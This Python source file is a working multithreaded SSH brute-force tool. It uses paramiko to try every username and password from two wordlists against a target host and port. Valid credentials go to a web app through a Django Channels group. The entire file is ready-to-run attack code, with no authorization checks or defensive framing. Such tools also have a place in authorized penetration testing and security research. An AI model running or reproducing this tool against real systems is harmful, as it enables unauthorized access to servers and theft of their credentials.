import json
import paramiko
import threading
import queue
from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer

channel_layer = get_channel_layer()
output_lines = []
success=[]
def clear_data():
    output_lines.clear()

def send(data):
    async_to_sync(channel_layer.group_send)(
        "output",  # Replace with a unique group name
        {
            "type": "send_output",
            "text": json.dumps(data)
        }
    )

def ssh_bruteforce(host, port, username, password):
    retries = 0
    while retries < 3:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname=host, port=port, username=username, password=password)
            success_message = f"Success! Host: {host}, Port: {port}, Username: {username}, Password: {password}"
            output = {'from': 'checker', 'error': False, 'content': success_message}
            s_m={"host":host,"pass":password,"user":username}
            output_lines.append(output)
            success.append(s_m)
            send(success)
            client.close()
            retries=3
            return True
        except paramiko.AuthenticationException:
            pass  # Handle the authentication failure case
        except paramiko.SSHException as e:
            retries += 1
            if retries >= 3:
                break
        except Exception as e:
            error_message = f"Error connecting. Host: {host}, Port: {port}, Username: {username}, Password: {password}, Error: {str(e)}"
            # print(error_message)
            output = {'from': 'checker', 'error': True, 'error_content': error_message}
            send(output)
            raise
            

def worker(host, port, usernames, password_queue):
    while not password_queue.empty():
        password = password_queue.get()
        for username in usernames:
            if ssh_bruteforce(host, port, username, password):
                break
        password_queue.task_done()

def check(host, user, passw, port):
    print(host)
    target_host = host
    target_port = port
    num_threads = 8

    try:
        with open(user, 'r') as user_file:
            usernames = user_file.read().splitlines()
    except FileNotFoundError:
        print(f"Username wordlist not found at {user}")
        raise

    try:
        with open(passw, 'r') as pass_file:
            passwords = pass_file.read().splitlines()
    except FileNotFoundError:
        
        print(f"Password wordlist not found at {passw}")
        raise

    password_queue = queue.Queue()
    for password in passwords:
        password_queue.put(password)

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(target_host, target_port, usernames, password_queue))
        t.daemon = True
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    return success

